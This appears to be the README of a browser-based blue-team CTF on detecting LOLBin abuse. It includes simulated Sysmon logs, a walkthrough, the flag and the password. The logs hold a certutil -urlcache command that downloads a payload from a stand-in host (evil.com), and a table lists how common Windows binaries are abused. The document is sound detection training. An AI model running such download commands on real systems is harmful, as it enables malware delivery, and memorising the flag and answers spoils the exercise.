# 🕵️ Hunt for LOLBins - CTF Challenge

## 📋 Overview

**Hunt for LOLBins** is an interactive, browser-based Capture The Flag (CTF) challenge designed for cybersecurity training. This challenge focuses on detecting Living-off-the-Land Binaries (LOLBins) abuse - where attackers use legitimate system tools like certutil, mshta, and PowerShell for malicious purposes. Participants analyze process creation logs to identify suspicious parent-child relationships and command-line patterns.

## 🎯 Learning Objectives

By completing this CTF, participants will learn:

- **LOLBin Identification**: Recognize commonly abused system binaries (certutil, mshta, powershell)
- **Process Tree Analysis**: Detect anomalous parent-child process relationships (Excel spawning PowerShell)
- **Command Line Inspection**: Identify suspicious command-line arguments (-urlcache, -enc, encoded commands)
- **Legitimacy Assessment**: Determine if LOLBin usage is authorized or malicious
- **Defense Strategies**: Implement application whitelisting to prevent LOLBin abuse

## 🛠️ Challenge Tasks (5 Total)

| Task | Description | Skill Focus |
|------|-------------|-------------|
| **Task 1** | Identify LOLBin used for file downloads (certutil) | LOLBin Knowledge |
| **Task 2** | Find anomalous parent-child process (Excel.exe → PowerShell) | Process Analysis |
| **Task 3** | Detect suspicious certutil command with -urlcache flag | Command Line Analysis |
| **Task 4** | Determine if certutil usage is legitimate (no admin scripts exist) | Legitimacy Assessment |
| **Task 5** | Recommend blocking rule (application whitelisting) | Defense Strategy |

## 🚀 Quick Start

### Prerequisites
- A modern web browser (Chrome, Firefox, Edge, Safari)
- No server required - runs entirely in the browser
- No installation needed

### Access the Challenge
1. Open the HTML file directly in your browser
2. Enter your name
3. Use the password: `45_2026`
4. Complete all 5 tasks to capture the flag

### Hosting on GitHub Pages
1. Fork or clone this repository
2. Go to repository Settings > Pages
3. Select the branch (usually `main`) and save
4. Access via `https://your-username.github.io/repository-name`

## 🎮 How to Play

### Login
```
Password: 45_2026
Name: Enter any name (progress is saved locally)
```

### Game Features

- **Interactive Process Tree**: Visual representation of parent-child process relationships
- **Color-coded Anomalies**: Red highlighting for suspicious processes and commands
- **Process Creation Logs**: Simulated Sysmon Event 1 logs with detailed entries
- **Command Line Display**: Captured command lines with malicious indicators
- **Legitimacy Check Panel**: Admin scripts directory and scheduled tasks review
- **Answer Validation**: Immediate feedback on submitted answers
- **Progress Tracking**: Local storage saves your progress across sessions

### Completing Tasks
1. Read each task description carefully
2. Analyze the process tree and command-line logs
3. Identify suspicious LOLBin usage patterns
4. Type your answer in the input field
5. Click "Submit" to validate
6. Complete all 5 tasks to reveal the flag

## 🏆 Flag

```
FLAG{LOLBIN_DETECTED}
```

The flag is revealed only after completing all 5 tasks successfully.

## 📊 Challenge Details

### Process Tree Visualization

```
🖥️ SYSTEM PROCESS TREE (simulated live)
├─ winword.exe (4520)
│  └─ cmd.exe (4521)
├─ excel.exe (5580) ⚠️ SUSPICIOUS
│  └─ powershell.exe (5581) 🔴 ANOMALOUS
│     └─ certutil.exe -urlcache ... 💀 MALICIOUS
├─ explorer.exe (1200)
│  └─ mshta.exe (1201)
└─ svchost.exe (800) [legitimate]
```

### Process Creation Events (Sysmon Event 1)

```
Process Create: winword.exe (PID 4520) → cmd.exe (PID 4521)
Process Create: excel.exe (PID 5580) → powershell.exe (PID 5581)  ⚠️
Process Create: powershell.exe (PID 5581) → certutil.exe -urlcache -f http://evil.com/payload.exe C:\Temp\bad.exe  🔴
Process Create: explorer.exe (PID 1200) → mshta.exe (PID 1201)
Process Create: svchost.exe (PID 800) → legitimate_service.exe
```

### Suspicious Command Lines

```
certutil.exe -urlcache -f http://evil.com/payload.exe C:\Temp\bad.exe  🔴 MALICIOUS
certutil.exe -encode input.txt output.txt  (benign encoding)
mshta.exe javascript:alert('test')  (potentially suspicious)
```

## 🔍 Investigation Walkthrough

### Task 1: LOLBin for Downloads
**Certutil.exe** is a legitimate Windows certificate utility commonly abused by attackers to download files from the internet using the `-urlcache` flag. It is a classic LOLBin because:
- It's a signed Microsoft binary
- Often allowed by application whitelisting
- Has network download capabilities
- Typically not monitored by basic security tools

### Task 2: Anomalous Parent-Child
**Excel.exe spawning PowerShell** is highly suspicious because:
- Office applications rarely need to launch PowerShell
- This pattern indicates macro-based attacks
- Excel macros often use PowerShell for fileless malware execution
- Normal Office operations don't require shell access

### Task 3: Suspicious Command Line
The certutil command downloading from `http://evil.com/payload.exe` is clearly malicious:
- Uses `-urlcache` for network download
- Downloads from suspicious external domain
- Saves to temporary directory (`C:\Temp`)
- File named `bad.exe` suggests malicious intent

### Task 4: Legitimacy Check
There is **no legitimate admin script** using certutil -urlcache because:
- Admin scripts directory is empty
- No scheduled tasks reference certutil
- No IT admin logged in during the incident
- No business justification for certutil downloads

### Task 5: Blocking Recommendation
**Application whitelisting** is the recommended defense because:
- Prevents execution of unapproved binaries
- Can block LOLBins when not needed
- More effective than signature-based detection
- Can be implemented via AppLocker or WDAC

## 🎨 Visual Features

- **Process Tree Visualization**: Hierarchical display of process relationships
- **Color-coded Suspicious Indicators**: Red/orange for anomalous activities
- **Command Line Syntax Highlighting**: Different colors for paths, URLs, and flags
- **Progress Badges**: Visual completion status for each task
- **Glowing Flag Animation**: Celebratory flag reveal with green glow
- **Toast Notifications**: Non-intrusive success/error messages
- **Dark Theme**: Matrix-green accents for LOLBin hunting theme

## 💾 Data Storage

- **Progress**: Saved in browser's `localStorage`
- **Persistence**: Progress survives page refreshes
- **Privacy**: All data stays on the user's device
- **Reset**: Clear browser data to reset progress

## 🛡️ Common LOLBins Reference

| LOLBin | Common Abuse | Legitimate Use |
|--------|-------------|----------------|
| **certutil.exe** | Download files, decode base64 | Certificate management |
| **mshta.exe** | Execute HTA payloads | HTML applications |
| **powershell.exe** | Execute scripts, download payloads | System administration |
| **regsvr32.exe** | Execute DLLs from remote URLs | Register DLL files |
| **rundll32.exe** | Execute DLL functions | Run DLL functions |
| **wmic.exe** | Execute commands remotely | WMI queries |
| **msbuild.exe** | Execute C# payloads | Build .NET projects |
| **cscript.exe** | Execute VBS scripts | Script execution |

## 📁 File Structure

```
hunt-lolbins/
│
├── index.html          # Main CTF challenge file
├── README.md           # This documentation
└── (no other files required)
```

## 🔧 Technical Implementation

- **Pure Frontend**: HTML5, CSS3, JavaScript (Vanilla)
- **No Dependencies**: Zero external libraries
- **Responsive Design**: Works on desktop and mobile
- **Animations**: CSS keyframe animations for process tree
- **Storage**: Browser localStorage API
- **Gamification**: Progress tracking, badge system, visual rewards

## 📊 LOLBin Detection Indicators

### High-Fidelity Indicators:
- Office applications spawning command shells
- certutil with `-urlcache` or `-urlsplit` flags
- Encoded PowerShell commands (`-enc` flag)
- Downloads to temporary directories
- Base64 encoded command lines

### Medium-Fidelity Indicators:
- Unusual parent-child process relationships
- System tools accessing external IPs
- Process execution from user-writable directories
- Tools being used outside normal hours

### Low-Fidelity Indicators:
- Single instances of LOLBin execution
- Known administrative scripts
- Documented maintenance activities

## 🎓 Educational Use Cases

- **Cybersecurity Training Programs**
- **SOC Analyst Onboarding**
- **Threat Hunting Workshops**
- **Blue Team Exercises**
- **Malware Analysis Training**
- **Academic Courses** (System Security, Threat Detection)
- **Self-paced Learning**
- **Red Team/Blue Team Exercises**

## 🔄 Version History

- **v1.0** - Initial release
  - 5 tasks with validation
  - Interactive process tree visualization
  - Simulated Sysmon Event 1 logs
  - Local storage progress tracking
  - Student login system


## 👥 Target Audience

- Security Operations Center (SOC) Analysts
- Incident Response Team Members
- Threat Hunters
- Malware Analysts
- Cybersecurity Students
- IT Security Professionals
- Blue Team Practitioners


---

**Happy LOLBin Hunting! 🕵️**
